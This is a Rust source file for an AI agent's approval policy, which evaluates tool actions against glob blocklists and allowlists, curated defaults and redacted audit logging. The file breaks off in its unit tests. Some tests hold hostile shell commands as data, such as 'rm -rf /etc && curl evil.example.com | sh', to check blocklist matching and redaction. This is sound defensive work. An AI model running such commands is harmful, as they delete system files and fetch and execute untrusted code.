//! Configuration-driven approval policy.
//!
//! Loads approval rules from `~/.aleph/approval-policy.json` and evaluates
//! action requests against blocklists, allowlists, and per-action-type defaults.

use std::collections::HashMap;
use std::io::Read;
use std::path::PathBuf;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use tracing::{debug, error, info, warn};

use super::policy::ApprovalPolicy;
use super::types::{ActionRequest, ActionType, ApprovalDecision, DefaultDecision};

// ---------------------------------------------------------------------------
// JSON config schema
// ---------------------------------------------------------------------------

/// Top-level policy configuration, deserialized from JSON.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyConfig {
    /// Per-action-type default decisions.
    pub defaults: HashMap<ActionType, DefaultDecision>,
    /// Rules that unconditionally allow matching actions.
    #[serde(default)]
    pub allowlist: Vec<PolicyRule>,
    /// Rules that unconditionally deny matching actions.
    #[serde(default)]
    pub blocklist: Vec<PolicyRule>,
}

/// A single allowlist or blocklist entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyRule {
    /// The action type this rule applies to.
    #[serde(rename = "type")]
    pub action_type: ActionType,
    /// Glob pattern matched against the action target.
    pub pattern: String,
}

/// Upper bound on the size of the policy file that is read from disk.
///
/// A policy file is a small JSON document written by a human. The limit
/// keeps a huge (or endless) file from being pulled into memory on the
/// approval path; a file over the limit is treated like a broken file
/// (every action escalates to `Ask`).
const MAX_POLICY_FILE_BYTES: u64 = 1024 * 1024;

// ---------------------------------------------------------------------------
// Glob matching
// ---------------------------------------------------------------------------

/// Convert a glob pattern to a regex string.
///
/// Pattern rules:
/// - `*`  matches any characters except `/`
/// - `**` matches any characters including `/` and newlines
/// - `?`  matches a single character (except `/`)
///
/// This intentionally mirrors the logic in `exec/approval/binding.rs`.
fn glob_to_regex_str(pattern: &str) -> String {
    let mut regex_str = String::with_capacity(pattern.len() * 4 + 4);
    // `(?s)` lets the `.` emitted by `**` span newlines, so a multi-line target
    // cannot evade a `**` blocklist rule. `*`/`?` use `[^/]`, which already
    // matches newlines, so single-star semantics are unchanged.
    regex_str.push_str("(?s)^");

    let mut chars = pattern.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '*' => {
                if chars.peek() == Some(&'*') {
                    chars.next();
                    // ** matches everything including /
                    // If followed by /, make the slash optional so **/x matches x
                    if chars.peek() == Some(&'/') {
                        chars.next();
                        regex_str.push_str("(.*/)?");
                    } else {
                        regex_str.push_str(".*");
                    }
                } else {
                    // * matches everything except /
                    regex_str.push_str("[^/]*");
                }
            }
            '?' => regex_str.push_str("[^/]"),
            '.' | '(' | ')' | '[' | ']' | '{' | '}' | '^' | '$' | '|' | '+' | '\\' => {
                regex_str.push('\\');
                regex_str.push(ch);
            }
            _ => regex_str.push(ch),
        }
    }

    regex_str.push('$');
    regex_str
}

/// Upper bound on the compiled-glob cache. Patterns come from operator config
/// (low cardinality by construction), but cap the map anyway so a pathological
/// caller cannot grow it without bound: at capacity, misses compile fresh
/// without inserting.
const GLOB_CACHE_MAX: usize = 512;

/// Compiled form of `pattern`, from a process-wide cache. `Err` = the pattern
/// does not compile (cached too, so a bad pattern is not re-compiled on every
/// resolve). `regex::Regex` clones are cheap (`Arc`-backed); `regex::Error`
/// clones are cheap because it is a boxed error kind.
fn cached_glob_regex(pattern: &str) -> Result<regex::Regex, regex::Error> {
    use crate::sync_primitives::Mutex;
    use std::sync::OnceLock;
    static CACHE: OnceLock<Mutex<HashMap<String, Result<regex::Regex, regex::Error>>>> =
        OnceLock::new();
    let cache = CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    {
        let guard = cache.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(hit) = guard.get(pattern) {
            return hit.clone();
        }
    }
    let compiled =
        crate::security::safe_regex::bounded_builder(&glob_to_regex_str(pattern)).build();
    if let Err(e) = &compiled {
        // A pattern that does not compile is a CONFIG ERROR, not "no match":
        // a caller that reads "no match" as "no rule applies" drops the rule
        // silently and falls back to the default permission (fail open). The
        // blocklist path is deliberately fail-closed for the same reason, so
        // the failure is logged loudly here instead of being swallowed.
        // The pattern itself is operator-authored and may embed a secret, so
        // only its redacted form reaches the log.
        error!(
            pattern = %redact_target(pattern),
            error = %e,
            "glob pattern does not compile; rules using it will not match"
        );
    }
    let mut guard = cache.lock().unwrap_or_else(|e| e.into_inner());
    if guard.len() < GLOB_CACHE_MAX {
        guard.insert(pattern.to_string(), compiled.clone());
    }
    compiled
}

/// Match a value against a glob pattern.
///
/// Compiled patterns are cached process-wide: this sits on the tool-permission
/// hot path (`ToolPermissionsConfig::resolve_explicit` runs it per glob
/// override per tool on every `list()` / `describe()` / `execute()`), where a
/// fresh compile per call multiplied out to hundreds of compiles per turn.
/// [`ConfigApprovalPolicy::check`] still uses its own per-instance
/// pre-compiled rules.
///
/// A pattern that does not compile is logged as an error (see
/// [`cached_glob_regex`]) and answers `false`. A caller that must NOT read
/// "no match" as "no rule applies" — a permission override whose pattern is
/// broken is silently skipped, which resolves the tool to the DEFAULT
/// permission, i.e. fail open — uses [`try_matches_glob`] and decides for
/// itself what an uncompilable pattern means.
#[must_use]
pub fn matches_glob(value: &str, pattern: &str) -> bool {
    try_matches_glob(value, pattern).unwrap_or(false)
}

/// Match a value against a glob pattern, reporting a pattern that does not
/// compile.
///
/// The fallible twin of [`matches_glob`]: `Ok(true)` / `Ok(false)` is a real
/// match decision, `Err` is "the pattern is broken" — a different question
/// with a different answer, which must not be collapsed into "no match".
#[must_use]
pub fn try_matches_glob(value: &str, pattern: &str) -> Result<bool, regex::Error> {
    cached_glob_regex(pattern).map(|re| re.is_match(value))
}

/// The compiled rules that apply to `action`: the rules written for the
/// action itself first, then the rules written for the action it was renamed
/// from (see [`ActionType::inherited_from`]).
///
/// The parent's rules are consulted even when the child has rules of its own:
/// a rule written for the parent is a rule about the whole family, and
/// dropping it because the child happens to name another target would
/// silently widen what the child may do — for the blocklist, that is exactly
/// the "rename the action and the deny rule stops applying" hole.
fn applicable_rules<'a>(
    by_type: &'a HashMap<ActionType, Vec<CompiledRule>>,
    action: &ActionType,
) -> impl Iterator<Item = &'a CompiledRule> {
    let own = by_type.get(action).map(|r| r.as_slice()).unwrap_or(&[]);
    let inherited = action
        .inherited_from()
        .and_then(|parent| by_type.get(&parent))
        .map(|rules| rules.as_slice())
        .unwrap_or(&[]);
    own.iter().chain(inherited.iter())
}

/// A compiled policy rule, pairing the original glob pattern with its regex.
#[derive(Debug, Clone)]
struct CompiledRule {
    /// Original glob pattern (used for logging and audit messages).
    pattern: String,
    /// Compiled regex for matching.
    regex: regex::Regex,
}

/// Pre-compile a list of [`PolicyRule`]s into a map keyed by [`ActionType`].
///
/// `fail_closed` distinguishes the security-critical blocklist from the
/// convenience-only allowlist:
///
/// - **`fail_closed = true`** (blocklist): a compile failure inserts a
///   synthetic match-anything rule for the affected `ActionType`, so EVERY
///   target of that action is denied unconditionally. The operator's broken
///   blocklist must NOT silently resolve to something weaker than what they
///   wrote — that is exactly the shape of fail-open the curated-vs-broken
///   file split (see [`Self::load_from`]) exists to prevent, and it bites
///   hardest on default-Allow action families (BrowserNavigate, BrowserClick,
///   …) where a typo'd blocklist rule used to let every target fall through
///   to `Allow`.
/// - **`fail_closed = false`** (allowlist): a compile failure is logged at
///   `warn!` and the rule is silently skipped; the policy falls back to its
///   defaults. A broken allowlist is a convenience loss, not a security
///   regression: the defaults remain in force, and for a default-Deny action
///   the fall-through is still Deny.
///
/// `label` names the rule source in log messages ("blocklist" / "allowlist").
#[allow(clippy::regex_creation_in_loops)] // `MATCH_ANYTHING` is a `OnceLock`, so the
                                          // embedded `Regex::new` runs at most once per
                                          // process regardless of how many rules fail.
fn compile_rules_grouped(
    rules: &[PolicyRule],
    fail_closed: bool,
    label: &str,
) -> HashMap<ActionType, Vec<CompiledRule>> {
    // The fail-closed fallback: `(?s).*` matches every string (DOTALL),
    // including the empty one. Constructed lazily via `OnceLock` so the
    // (literal, infallible) compile cost is paid once per process. `Regex`
    // clones share the underlying automaton, so reusing one instance keeps
    // the per-rule insert cheap.
    static MATCH_ANYTHING: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();

    let mut grouped: HashMap<ActionType, Vec<CompiledRule>> = HashMap::new();
    for rule in rules {
        // The RULE is folded the same way the TARGET is folded at match time
        // (see `canonicalize_url_case`), so a rule written in lower case
        // still matches a URL that spells its scheme or host in upper case.
        // `CompiledRule::pattern` keeps the operator's original text: it is
        // what the deny reason quotes.
        let regex_str = glob_to_regex_str(&canonicalize_url_case(&rule.pattern));
        match crate::security::safe_regex::bounded_builder(&regex_str).build() {
            Ok(regex) => {
                grouped
                    .entry(rule.action_type.clone())
                    .or_default()
                    .push(CompiledRule {
                        pattern: rule.pattern.clone(),
                        regex,
                    });
            }
            Err(e) => {
                if fail_closed {
                    // `(?s).*` is a fundamental regex — its compile can
                    // only fail if the underlying engine regresses, and
                    // then the process is already in trouble. `expect`
                    // rather than `unwrap` so the failure mode is named.
                    let match_anything = MATCH_ANYTHING.get_or_init(|| {
                        regex::Regex::new("(?s).*").expect("static regex pattern `(?s).*`")
                    });
                    error!(
                        pattern = %redact_target(&rule.pattern),
                        error = %e,
                        "Failed to compile {label} glob pattern; denying all matching actions (fail-closed)"
                    );
                    grouped
                        .entry(rule.action_type.clone())
                        .or_default()
                        .push(CompiledRule {
                            pattern: rule.pattern.clone(),
                            regex: match_anything.clone(),
                        });
                } else {
                    warn!(
                        pattern = %redact_target(&rule.pattern),
                        error = %e,
                        "Failed to compile {label} glob pattern; skipping rule"
                    );
                }
            }
        }
    }
    grouped
}

// ---------------------------------------------------------------------------
// ConfigApprovalPolicy
// ---------------------------------------------------------------------------

/// An [`ApprovalPolicy`] backed by a JSON configuration file.
///
/// Decision logic (evaluated in order):
/// 1. If the target matches any **blocklist** entry for the action type → `Deny`
/// 2. If the target matches any **allowlist** entry for the action type → `Allow`
/// 3. Fall back to the **defaults** map for the action type
/// 4. If no default is configured → `Ask`
pub struct ConfigApprovalPolicy {
    config: PolicyConfig,
    blocklist_by_type: HashMap<ActionType, Vec<CompiledRule>>,
    allowlist_by_type: HashMap<ActionType, Vec<CompiledRule>>,
}

impl ConfigApprovalPolicy {
    /// Create a new policy from an explicit [`PolicyConfig`].
    #[must_use]
    pub fn new(config: PolicyConfig) -> Self {
        // Blocklist is security-critical: a compile failure must NOT silently
        // resolve to "weaker than what the operator wrote" (see the doc on
        // [`compile_rules_grouped`] for the default-Allow example). Allowlist
        // stays fail-open: a broken allowlist rule is a convenience loss, and
        // the defaults remain in force either way.
        let blocklist_by_type = compile_rules_grouped(&config.blocklist, true, "blocklist");
        let allowlist_by_type = compile_rules_grouped(&config.allowlist, false, "allowlist");
        Self {
            config,
            blocklist_by_type,
            allowlist_by_type,
        }
    }

    /// Load the policy from `~/.aleph/approval-policy.json`.
    ///
    /// See [`Self::load_from`] for what happens when the file is absent or
    /// unusable — the two cases are deliberately not the same.
    ///
    /// The policy is read from ONE canonical location. When that location
    /// cannot be determined (no `HOME` / `USERPROFILE`), there is no
    /// trustworthy place to read a policy from: a file in the current
    /// directory or in the shared temp directory is writable by anything
    /// running as this user, so it is not a policy source. The safe posture
    /// (every action escalates to `Ask`) is used instead.
    #[must_use]
    pub fn load() -> Self {
        let Some(path) = Self::canonical_config_path() else {
            error!(
                "Cannot determine the configuration directory, so there is no approval policy to read. Falling back to the safe posture: every action requires approval."
            );
            return Self::safe_default();
        };
        Self::load_from(path)
    }

    /// Load the policy from the given path. The fallback is chosen by **cause**,
    /// because "the operator never wrote a policy" and "the operator's policy is
    /// broken" are different facts and deserve different postures:
    ///
    /// - **File absent** → [`Self::default`], the curated map. Nothing in the
    ///   product ever writes this file, so absence is the shipped state of every
    ///   install; treating it as "deny everything" made the entire
    ///   approval-gated tool surface (browser, desktop, PIM, media, hooks)
    ///   return a refusal the model could not resolve — there is no in-product
    ///   action that creates the file. The curated map is the documented intent
    ///   and keeps read-only browser motion usable while still routing
    ///   state-changing and egress verbs through approval.
    /// - **File present but unreadable or unparseable** → `Self::safe_default`,
    ///   every action escalates to `Ask`. A corrupt or unreadable policy must
    ///   never silently resolve to something *weaker* than what the operator
    ///   wrote, and unlike absence this state is visible and fixable.
    ///
    /// Note this layer only supplies policy *defaults*; the interactive
    /// approval surface that a resulting `Ask` is routed to lives in
    /// `src/exec/approval` + `src/tools/scoped`.
    pub fn load_from(path: PathBuf) -> Self {
        // The policy file is a small JSON document written by a human, so it
        // is read through a BOUNDED reader: an unbounded read would pull a
        // huge (or endless) file into memory on the approval path. One byte
        // past the limit is read on purpose — that extra byte is what makes
        // "this file is longer than the limit" observable without reading
        // all of it.
        let read = std::fs::File::open(&path).and_then(|file| {
            let mut limited = file.take(MAX_POLICY_FILE_BYTES + 1);
            let mut contents = String::new();
            limited.read_to_string(&mut contents)?;
            Ok(contents)
        });
        match read {
            Ok(contents) => {
                if contents.len() as u64 > MAX_POLICY_FILE_BYTES {
                    error!(
                        "Approval policy at {} is larger than the {}-byte limit, so it is not read. Falling back to the safe posture: every action requires approval.",
                        path.display(),
                        MAX_POLICY_FILE_BYTES
                    );
                    return Self::safe_default();
                }
                match serde_json::from_str::<PolicyConfig>(&contents) {
                    Ok(config) => {
                        debug!("Loaded approval policy from {}", path.display());
                        Self::new(config)
                    }
                    Err(e) => {
                        error!(
                            "Failed to parse approval policy at {}: {}. The file exists but is broken, so falling back to the safe posture: every action requires approval.",
                            path.display(),
                            e
                        );
                        Self::safe_default()
                    }
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                debug!(
                    "No approval policy at {}. Using the curated built-in defaults (read-only browser motion allowed; state-changing, egress, desktop, PIM, media and hooks actions ask).",
                    path.display()
                );
                Self::default()
            }
            Err(e) => {
                error!(
                    "Failed to read approval policy at {}: {}. The file exists but is unreadable, so falling back to the safe posture: every action requires approval.",
                    path.display(),
                    e
                );
                Self::safe_default()
            }
        }
    }

    /// The canonical location of the policy file, or `None` when the
    /// configuration directory cannot be determined (no `HOME` /
    /// `USERPROFILE`).
    fn canonical_config_path() -> Option<PathBuf> {
        crate::utils::paths::get_config_dir()
            .ok()
            .map(|dir| dir.join("approval-policy.json"))
    }

    /// Return the expected path for the configuration file. Also one of the
    /// paths the model's file tools may never touch
    /// (`builtin_tools::file_ops::get_denied_paths`).
    ///
    /// This is the DENY-LIST entry, not the read path: the policy itself is
    /// only ever read from [`Self::canonical_config_path`] (see
    /// [`Self::load`]), so the fallback below is a placeholder that keeps the
    /// deny-list shape stable when the configuration directory is unknown.
    pub(crate) fn config_path() -> PathBuf {
        Self::canonical_config_path().unwrap_or_else(|| {
            warn!("Cannot determine home directory; the approval policy path is unknown");
            std::env::current_dir()
                .unwrap_or_else(|_| std::env::temp_dir())
                .join(".aleph")
                .join("approval-policy.json")
        })
    }

    /// Safe fallback for the one cause that warrants it: the policy file
    /// **exists** but cannot be read or parsed.
    ///
    /// The empty `defaults` map makes [`ApprovalPolicy::check`] fall through to
    /// its step 4, so every action type returns [`ApprovalDecision::Ask`] —
    /// never silently allow or deny. This ensures a broken config cannot weaken
    /// security. It is deliberately **not** the fallback for an absent file;
    /// see [`Self::load_from`] for why the two causes diverge.
    fn safe_default() -> Self {
        Self::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![],
            blocklist: vec![],
        })
    }
}

impl Default for ConfigApprovalPolicy {
    /// The curated built-in policy. This is the posture of an install with no
    /// `~/.aleph/approval-policy.json` — [`ConfigApprovalPolicy::load_from`]
    /// returns it on the file-absent arm, so it is production behavior, not a
    /// test convenience.
    ///
    /// Sensible defaults:
    /// - Browser navigate/click/type → Allow
    /// - Browser evaluate → Ask
    /// - Browser open → Ask (a denied `browser_navigate` target was reachable
    ///   here; tighten by default so the SSRF/approval guard survives the
    ///   `tools.invoke` switch)
    /// - Browser switch engine → Ask (it launches a browser and copies every
    ///   cookie into it; inherits `browser_open` when a policy file names
    ///   only that one)
    /// - Browser scroll/hover/press_key → Allow (read-only motion)
    /// - Browser select/drag/dialog/upload → Ask (page-state changing or
    ///   file-egress)
    /// - Browser cookies write → Ask (the value is a credential by design)
    /// - Browser identity override / session state → Ask (same reason: a
    ///   request header and a saved storage state are both credentials)
    /// - Desktop actions → Ask, including `desktop read clipboard`, which had
    ///   no entry at all until the census here was derived from
    ///   `ActionType::ALL`. It resolved to Ask by falling through, which is the
    ///   posture `system_tool`'s `clipboard_read` arm wants — so this line
    ///   changes no behaviour and states an intent that "absent" could not.
    /// - Hooks manage → Ask (control-plane write)
    /// - Browser record start → Ask (writes a growing video file; the page's
    ///   pixels stream through an encoder — same family as evaluate's read).
    ///   stop/status are not gated: an off-switch behind a gate is fail-dead.
    fn default() -> Self {
        let mut defaults = HashMap::new();
        defaults.insert(ActionType::BrowserNavigate, DefaultDecision::Allow);
        defaults.insert(ActionType::BrowserClick, DefaultDecision::Allow);
        defaults.insert(ActionType::BrowserType, DefaultDecision::Allow);
        defaults.insert(ActionType::BrowserFill, DefaultDecision::Allow);
        defaults.insert(ActionType::BrowserEvaluate, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserOpen, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserSwitchEngine, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserSelect, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserDialog, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserPressKey, DefaultDecision::Allow);
        defaults.insert(ActionType::BrowserScroll, DefaultDecision::Allow);
        defaults.insert(ActionType::BrowserHover, DefaultDecision::Allow);
        defaults.insert(ActionType::BrowserDrag, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserUpload, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserCookiesWrite, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserIdentityOverride, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserSessionState, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserNetworkMock, DefaultDecision::Ask);
        defaults.insert(ActionType::BrowserRecord, DefaultDecision::Ask);
        defaults.insert(ActionType::HooksManage, DefaultDecision::Ask);
        defaults.insert(ActionType::DesktopClick, DefaultDecision::Ask);
        defaults.insert(ActionType::DesktopType, DefaultDecision::Ask);
        defaults.insert(ActionType::DesktopKeyCombo, DefaultDecision::Ask);
        defaults.insert(ActionType::DesktopLaunchApp, DefaultDecision::Ask);
        defaults.insert(ActionType::DesktopReadClipboard, DefaultDecision::Ask);
        defaults.insert(ActionType::DesktopAutomation, DefaultDecision::Ask);
        defaults.insert(ActionType::PimWrite, DefaultDecision::Ask);
        defaults.insert(ActionType::MediaCapture, DefaultDecision::Ask);

        Self::new(PolicyConfig {
            defaults,
            allowlist: vec![],
            blocklist: vec![],
        })
    }
}

impl ConfigApprovalPolicy {
    /// The policy evaluation itself — pure, with no audit side effect.
    ///
    /// Split out of [`ApprovalPolicy::check`] so that the ONE place that
    /// knows a decision was produced is also the place that records it.
    fn decide(&self, request: &ActionRequest) -> ApprovalDecision {
        let action = &request.action_type;
        let prompt_target = if request.display_target.is_empty() {
            &request.target
        } else {
            &request.display_target
        };
        // The scheme and the host of a URL are case-insensitive, but a glob
        // rule is matched literally — so the target is folded the same way the
        // rule was folded when it was compiled (see `canonicalize_url_case`).
        let target = canonicalize_url_case(&request.target);

        // 1. Blocklist takes priority (pre-compiled regexes, grouped by ActionType)
        if let Some(rule) = applicable_rules(&self.blocklist_by_type, action)
            .find(|rule| rule.regex.is_match(&target))
        {
            debug!(
                action = ?action,
                target = %redact_target(&request.target),
                pattern = %redact_target(&rule.pattern),
                "Blocked by blocklist rule"
            );
            return ApprovalDecision::Deny {
                reason: format!("Blocked by policy rule: {}", rule.pattern),
            };
        }

        // 2. Allowlist overrides defaults (pre-compiled regexes, grouped by ActionType)
        if let Some(rule) = applicable_rules(&self.allowlist_by_type, action)
            .find(|rule| rule.regex.is_match(&target))
        {
            debug!(
                action = ?action,
                target = %redact_target(&request.target),
                pattern = %redact_target(&rule.pattern),
                "Allowed by allowlist rule"
            );
            return ApprovalDecision::Allow;
        }

        // 3. Fall back to defaults
        // A policy file replaces these defaults wholesale, so an action the
        // operator did not name falls back to the action it was split out of
        // (see `ActionType::inherited_from`) before falling through to Ask.
        // Without this, renaming a variant loosens every existing policy file.
        let inherited = action.inherited_from();
        let resolved = self.config.defaults.get(action).or_else(|| {
            inherited
                .as_ref()
                .and_then(|parent| self.config.defaults.get(parent))
        });
        if let Some(default_decision) = resolved {
            return match default_decision {
                DefaultDecision::Allow => ApprovalDecision::Allow,
                DefaultDecision::Deny => ApprovalDecision::Deny {
                    reason: format!("Denied by default policy for {action}"),
                },
                DefaultDecision::Ask => ApprovalDecision::Ask {
                    prompt: format!(
                        "Action {action} on target '{prompt_target}' requires approval"
                    ),
                },
            };
        }

        // 4. No default → Ask
        ApprovalDecision::Ask {
            prompt: format!(
                "No policy configured for {action} on '{prompt_target}'. Please approve or deny."
            ),
        }
    }

    /// Replace every rule pattern that appears in `text` with its redacted
    /// form.
    ///
    /// A pattern is operator-authored and may embed a secret (a token inside a
    /// URL, a private path). The decision text keeps the pattern — the
    /// operator has to see WHICH rule fired — while the log gets only the
    /// redacted form, exactly like the target.
    fn redact_patterns_in(&self, text: &str) -> String {
        let mut out = text.to_string();
        for rules in self
            .blocklist_by_type
            .values()
            .chain(self.allowlist_by_type.values())
        {
            for rule in rules {
                if rule.pattern.is_empty() || !out.contains(&rule.pattern) {
                    continue;
                }
                out = out.replace(&rule.pattern, &redact_target(&rule.pattern));
            }
        }
        out
    }
}

#[async_trait]
impl ApprovalPolicy for ConfigApprovalPolicy {
    /// Evaluate the policy for one action request.
    ///
    /// The decision returned here is the one the caller acts on. An `Ask` is
    /// recorded HERE, at the point it is produced: the caller resolves an ask
    /// by lifting it, by refusing it, or by asking a human — and the refusal
    /// path records no final decision at all, so an ask that never produced
    /// an `Allow`/`Deny` would leave NO trace at all unless the ask itself is
    /// audited.
    async fn check(&self, request: &ActionRequest) -> ApprovalDecision {
        let decision = self.decide(request);
        if matches!(decision, ApprovalDecision::Ask { .. }) {
            self.record(request, &decision).await;
        }
        decision
    }

    async fn record(&self, request: &ActionRequest, decision: &ApprovalDecision) {
        // SECURITY: route both the target and the context through secret redaction
        // before logging. The `target` field already gets `redact_target`, but
        // `context` is built by `audit_identity` from a raw user-supplied target
        // (e.g. clipboard text, keystrokes) and was previously logged verbatim.
        // See APPROVAL-R3-001.
        //
        // The decision itself carries a `prompt` string for `Ask` variants
        // that embeds `prompt_target` (the raw user target). Logging `?decision`
        // would expose that target alongside any secrets it contains. Render
        // an explicit summary that routes the prompt through `SecretMasker`
        // and truncates.
        let masker = crate::exec::masker::SecretMasker::new();
        let decision_summary = match decision {
            ApprovalDecision::Allow => "Allow".to_string(),
            ApprovalDecision::Deny { reason } => {
                // The DECISION text keeps the pattern — the operator has to see
                // which rule fired — but the LOG must not carry it: a pattern
                // is operator-authored and may embed a secret.
                let redacted = self.redact_patterns_in(reason);
                format!("Deny {{ reason: {} }}", capped_audit_field(&masker.mask(&redacted)))
            }
            ApprovalDecision::Ask { prompt } => {
                let masked = capped_audit_field(&masker.mask(prompt));
                format!("Ask {{ prompt: {masked} }}")
            }
        };
        info!(
            action = ?request.action_type,
            target = %redact_target(&request.target),
            agent = %capped_audit_field(&request.agent_id),
            context = %capped_audit_field(&masker.mask(&request.context)),
            decision = %decision_summary,
            "Approval decision recorded"
        );
    }
}

/// Render a redacted audit log of an action target.
///
/// The hash is purely informational — used to correlate two records of the
/// same target across log lines without leaking the target itself. Uses
/// [`std::collections::hash_map::DefaultHasher`], which is **stable across
/// calls within a single process** but is not guaranteed stable across Rust
/// versions (the underlying algorithm is documented as unspecified, and has
/// historically been `SipHasher13`). This is acceptable: `redact_target`
/// runs only on the log emitter's path and the hash is never persisted or
/// compared across processes.
///
/// The same redaction is applied to operator-authored rule patterns: a pattern
/// may embed a secret (a token in a URL, a private path), so only its length
/// and a correlation hash reach the log.
fn redact_target(target: &str) -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut h = DefaultHasher::new();
    target.hash(&mut h);
    format!("<redacted len={} sha={:016x}>", target.len(), h.finish())
}

/// Cap a free-form audit field to a byte budget, walked back to a codepoint
/// boundary.
///
/// [`String::truncate`] PANICS when the cut lands inside a multi-byte
/// codepoint, and every field this caps carries arbitrary user-supplied text
/// (a masked context, an agent id, a deny reason), so the cut has to be
/// codepoint-safe. The cap keeps enough of the prefix to diagnose the
/// decision; it never changes the decision itself.
fn capped_audit_field(value: &str) -> String {
    const AUDIT_FIELD_MAX_BYTES: usize = 256;
    if value.len() <= AUDIT_FIELD_MAX_BYTES {
        return value.to_string();
    }
    let cut = crate::utils::text_format::truncate_bytes(value, AUDIT_FIELD_MAX_BYTES);
    let mut capped = cut.to_string();
    capped.push('…');
    capped
}

/// Fold the case of the scheme and the host of every URL-ish span in `value`.
///
/// A URL's scheme and host are case-insensitive, but a glob rule is matched
/// literally — so `HTTPS://MALICIOUS.COM/payload` slips past a rule written
/// as `*://malicious.com/*`. The rule and the target are folded the same way
/// (at compile time and at match time), so the rule still means what the
/// operator wrote.
///
/// Only the scheme token and the host are folded: the path and the query ARE
/// case-sensitive parts of a URL, and a target that holds no URL is returned
/// unchanged. The userinfo (`user:secret@host`) keeps its case as well — it
/// is a credential, not a name.
fn canonicalize_url_case(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some(idx) = rest.find("://") {
        // The scheme token runs back to the nearest delimiter. It is not
        // required to be a real scheme name: a rule may put a glob `*` there.
        let head = &rest[..idx];
        // The scan walks CHARACTERS, so the cut lands on a codepoint
        // boundary: a multi-byte delimiter (a CJK character in a target
        // string) must not be cut in half.
        let scheme_start = head
            .char_indices()
            .rev()
            .find(|(_, c)| !is_url_token_char(*c))
            .map_or(0, |(i, c)| i + c.len_utf8());
        let authority_start = idx + "://".len();
        let authority_end = rest[authority_start..]
            .find(|c| c == '/' || c == '?' || c == '#')
            .map_or(rest.len(), |i| authority_start + i);
        let authority = &rest[authority_start..authority_end];
        // Only the host (after the last `@`) is a name; the userinfo before it
        // is a credential and keeps its case.
        let (userinfo, host) = match authority.rfind('@') {
            Some(at) => (&authority[..=at], &authority[at + 1..]),
            None => ("", authority),
        };
        out.push_str(&rest[..scheme_start]);
        out.push_str(&head[scheme_start..].to_ascii_lowercase());
        out.push_str("://");
        out.push_str(userinfo);
        out.push_str(&host.to_ascii_lowercase());
        rest = &rest[authority_end..];
    }
    out.push_str(rest);
    out
}

/// Characters that may appear in the scheme token of a URL (RFC 3986 §3.1),
/// plus the glob metacharacters a rule may use in that position.
fn is_url_token_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.' | '*' | '?')
}

// ---------------------------------------------------------------------------
// Unit tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::approval::types::ActionRequest;
    use chrono::Utc;
    use std::sync::{Arc, Mutex};
    use tracing::field::Visit;
    use tracing::{Event, Subscriber};
    use tracing_subscriber::layer::{Context, Layer};
    use tracing_subscriber::prelude::__tracing_subscriber_SubscriberExt;
    use tracing_subscriber::registry::LookupSpan;
    use tracing_subscriber::util::SubscriberInitExt;
    use tracing_subscriber::EnvFilter;

    #[test]
    fn test_glob_single_star() {
        // * does not cross path boundaries
        assert!(matches_glob("file.txt", "*.txt"));
        assert!(!matches_glob("dir/file.txt", "*.txt"));
    }

    #[test]
    fn test_glob_double_star() {
        // ** crosses path boundaries
        assert!(matches_glob("a/b/c.txt", "**/*.txt"));
        assert!(matches_glob("c.txt", "**/*.txt"));
    }

    #[test]
    fn test_glob_question_mark() {
        assert!(matches_glob("file.txt", "fil?.txt"));
        assert!(!matches_glob("fill.txt", "fil?.tx"));
    }

    #[test]
    fn test_glob_url_pattern() {
        // Single * does not cross /
        assert!(matches_glob(
            "https://docs.github.com/actions",
            "https://*.github.com/*"
        ));
        assert!(!matches_glob(
            "https://docs.github.com/en/actions",
            "https://*.github.com/*"
        ));
        // ** matches across path separators
        assert!(matches_glob(
            "https://docs.github.com/en/actions",
            "https://*.github.com/**"
        ));
        assert!(matches_glob(
            "https://docs.github.com/en/actions/sub",
            "https://*.github.com/**"
        ));
    }

    #[test]
    fn test_glob_bundle_id() {
        assert!(matches_glob("com.apple.Safari", "com.apple.*"));
        assert!(!matches_glob("com.google.Chrome", "com.apple.*"));
    }

    #[test]
    fn test_glob_double_star_spans_newlines() {
        // A multi-line target must not evade a `**` blocklist rule — `**`
        // matches across newlines, matching its documented "everything" intent.
        assert!(matches_glob("rm -rf /etc\n&& curl evil | sh", "rm -rf **"));
        // Single `*` still does not cross `/`, even across a newline.
        assert!(!matches_glob("a\n/b", "a*"));
    }

    #[test]
    fn test_glob_special_chars() {
        // Dots and parens are escaped properly
        assert!(matches_glob("a.b.c", "a.b.c"));
        assert!(!matches_glob("axbxc", "a.b.c"));
    }

    #[test]
    fn redact_target_never_returns_raw_content() {
        let secret = "rm -rf /etc && curl evil.example.com | sh";
        let r = redact_target(secret);
        assert!(!r.contains("rm -rf"));
        assert!(!r.contains("evil.example.com"));
        assert!(r.contains(&secret.len().to_string()));
    }

    #[test]
    fn redact_target_is_stable_across_calls() {
        let s = "stable-content-123";
        assert_eq!(redact_target(s), redact_target(s));
    }

    #[derive(Default)]
    struct CapturedFields {
        pairs: Vec<(String, String)>,
    }

    impl Visit for CapturedFields {
        fn record_debug(&mut self, field: &tracing::field::Field, value: &dyn std::fmt::Debug) {
            self.pairs
                .push((field.name().to_string(), format!("{value:?}")));
        }
        fn record_str(&mut self, field: &tracing::field::Field, value: &str) {
